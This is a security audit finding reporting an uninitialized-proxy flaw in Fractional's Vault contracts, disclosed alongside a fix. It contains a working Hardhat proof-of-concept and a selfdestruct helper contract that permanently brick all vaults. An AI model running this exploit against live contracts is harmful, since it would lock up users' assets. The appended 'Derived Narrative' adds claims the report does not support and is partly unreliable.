---
id: 13871
severity: "High"
---

# Vault implementation can be destroyed leading to loss of all assets

## Description

This is a basic uninitialized proxy bug, the `VaultFactory` creates a single implementation of `Vault` and then creates a proxy to that implementation every time a new vault needs to be deployed.

The problem is that that implementation vault is not initialized, which means that anybody can initialize the contract to become the owner, and then destroy it by doing a delegate call (via the `execute` function) to a function with the `selfdestruct` opcode. Once the implementation is destroyed all of the vaults will be unusable. And since there’s no logic in the proxies to update the implementation - that means this is permanent (i.e. there’s no way to call any function on any vault anymore, they’re simply dead).

This is a critical bug, since ALL assets held by ALL vaults will be lost. There’s no way to transfer them out and there’s no way to run any function on any vault.

Also, there’s no way to fix the current deployed contracts (modules and registry), since they all depend on the factory vault, and there’s no way to update them to a different factory. That means Fractional would have to deploy a new set of contracts after fixing the bug (this is a relatively small issue though).

## Proof of Concept

I created the PoC based on the `scripts/deploy.js` file, here’s a stripped-down version of that:
    
```js
const { ethers } = require("hardhat");

const ZERO_ADDRESS = "0x0000000000000000000000000000000000000000";

async function main() {
    const [deployer, attacker] = await ethers.getSigners();

    // Get all contract factories
    const BaseVault = await ethers.getContractFactory("BaseVault");
    const Supply = await ethers.getContractFactory("Supply");
    const VaultRegistry = await ethers.getContractFactory("VaultRegistry");

    // Deploy contracts

    const registry = await VaultRegistry.deploy();
    await registry.deployed();

    const supply = await Supply.deploy(registry.address);
    await supply.deployed();

    // notice that the `factory` var in the original `deploy.js` file is a different factory than the registry's
    const registryVaultFactory = await ethers.getContractAt("VaultFactory", await registry.factory());

    const implVaultAddress = await registryVaultFactory.implementation();
    const vaultImpl = await ethers.getContractAt("Vault", implVaultAddress);

    const baseVault = await BaseVault.deploy(registry.address, supply.address);
    await baseVault.deployed();
    // proxy vault - the vault that's used by the user
    let proxyVault = await deployVault(baseVault, registry, attacker);

    const destructorFactory = await ethers.getContractFactory("Destructor");
    const destructor = await destructorFactory.deploy();

    let destructData = destructor.interface.encodeFunctionData("destruct", [attacker.address]);

    const abi = new ethers.utils.AbiCoder();
    const leafData = abi.encode(["address", "address", "bytes4"],
        [attacker.address, destructor.address, destructor.interface.getSighash("destruct")]);
    const leafHash = ethers.utils.keccak256(leafData);

    await vaultImpl.connect(attacker).init();

    await vaultImpl.connect(attacker).setMerkleRoot(leafHash);
    // we don't really need to do this ownership-transfer, because the contract is still usable till the end of the tx, but I'm doing it just in case
    await vaultImpl.connect(attacker).transferOwnership(ZERO_ADDRESS);

    // before: everything is fine
    let implVaultCode = await ethers.provider.getCode(implVaultAddress);
    console.log("Impl Vault code size before:", implVaultCode.length - 2); // -2 for the 0x prefix
    let owner = await proxyVault.owner();
    console.log("Proxy Vault works fine, owner is: ", owner);

    await vaultImpl.connect(attacker).execute(destructor.address, destructData, []);

    // after: vault implementation is destructed
    implVaultCode = await ethers.provider.getCode(implVaultAddress);
    console.log("\nVault code size after:", implVaultCode.length - 2); // -2 for the 0x prefix

    try {
        owner = await proxyVault.owner();
    } catch (e) {
        console.log("Proxy Vault isn't working anymore.", e.toString().substring(0, 300));
    }
}

async function deployVault(baseVault, registry, attacker) {
    const nodes = await baseVault.getLeafNodes();

    const tx = await registry.connect(attacker).create(nodes[0], [], []);
    const receipt = await tx.wait();

    const vaultEvent = receipt.events.find(e => e.address == registry.address);

    const newVaultAddress = vaultEvent.args._vault;
    const newVault = await ethers.getContractAt("Vault", newVaultAddress);
    return newVault;
}

if (require.main === module) {
    main()
}
```

`Destructor.sol` file:
    
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

contract Destructor{
    function destruct(address payable dst) public {
        selfdestruct(dst);
    }
}
```

Output:
    
```
Impl Vault code size before: 10386
Proxy Vault works fine, owner is:  0x5FbDB2315678afecb367f032d93F642f64180aa3

Vault code size after: 0
Proxy Vault isn't working anymore. Error: call revert exception [ See: https://links.ethers.org/v5-errors-CALL_EXCEPTION ] (method="owner()", data="0x", errorArgs=null, errorName=null, errorSignature=null, reason=null, code=CALL_EXCEPTION, version=abi/5.6.2)
```

Sidenote: as the comment in the code says, we don’t really need to transfer the ownership to the zero address. It’s just that Foundry’s `forge` did revert the destruction when I didn’t do it, with the error of `OwnerChanged` (i.e. once the `selfdestruct` was called the owner became the zero address, which is different than the original owner) so I decided to add this just in case. This is probably a bug in `forge`, since the contract shouldn’t destruct till the end of the tx (Hardhat indeed didn’t revert the destruction even when the attacker was the owner).

## Recommendation

Add init in `Vault`’s constructor (and make the `init` function `public` instead of `external`):
    
```solidity
contract Vault is IVault, NFTReceiver {
    /// @notice Address of vault owner
    address public owner;
    /// ...

    constructor(){
        // initialize implementation
        init();
    }

    /// @dev Initializes nonce and proxy owner
    function init() public {
```

Alternately you can add init in `VaultFactory.sol` constructor, but I think initializing in the contract itself is a better practice.
    
```solidity
    /// @notice Initializes implementation contract
    constructor() {
        implementation = address(new Vault());
        Vault(implementation).init();
    }
```

After mitigation the PoC will output this:
    
```
Error: VM Exception while processing transaction: reverted with custom error 'Initialized("0xa16E02E87b7454126E5E10d957A927A7F5B5d2be", "0x70997970C51812dc3A010C7d01b50e0d17dc79C8", 1)'
    at Vault._execute (src/Vault.sol:124)
    at Vault.init (src/Vault.sol:24)
    at HardhatNode._mineBlockWithPendingTxs
    ....
```

Acknowledging the severity of this and will fix it. Thank you for reporting @0xA5DF.

Agree this is High risk. If this had gone unnoticed for a period of time, then later self destructing the implementation contract would brick all vaults and lose funds for potentially many users.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability originates from an uninitialized implementation contract used by a proxy‑based vault system. The factory creates a single Vault implementation and then deploys lightweight proxy contracts that delegate all calls to this implementation. Because the implementation contract never runs its initialization routine, any external account can invoke the init function, become the recorded owner of the implementation, and subsequently use the proxy’s generic execute function to perform a delegatecall to an arbitrary contract containing a selfdestruct opcode. When the attacker triggers selfdestruct on the implementation, the bytecode of the implementation is removed from the blockchain. All existing proxy vaults continue to point to the now‑dead implementation, so every call routed through the proxy reverts or returns empty data. From a user’s perspective the vault UI appears to work initially, but after the destruction any attempt to query the owner, withdraw assets, or read balances fails with a CALL_EXCEPTION, giving the impression that funds have vanished even though the token balances still show the original amounts. The impact is systemic: every vault instantiated from the factory loses its underlying logic, making all deposited assets permanently inaccessible. The bug manifests whenever the factory deploys proxies without first initializing the implementation, a condition that is typical in many upgradeable‑proxy patterns when the constructor does not call init. The issue was uncovered during a security audit that included a proof‑of‑concept script; the attacker script called init on the implementation, transferred ownership, and then executed a selfdestruct via a deliberately deployed Destructor contract. The problem is hard to notice because the proxies appear functional until the implementation is destroyed, at which point all calls silently fail without obvious on‑chain evidence of the malfunction. To remediate the flaw, the implementation must be initialized immediately after deployment—either in its constructor or by the factory’s constructor—ensuring that the owner variable is set and that further init calls are rejected. Making the init function public (instead of external) and adding appropriate access checks prevents unauthorized ownership takeover. Additionally, the execute function should restrict delegatecalls to trusted contracts or be removed entirely, and the upgrade path should allow replacing a compromised implementation. These measures restore the guarantee that vault logic cannot be hijacked and that users’ funds remain accessible.
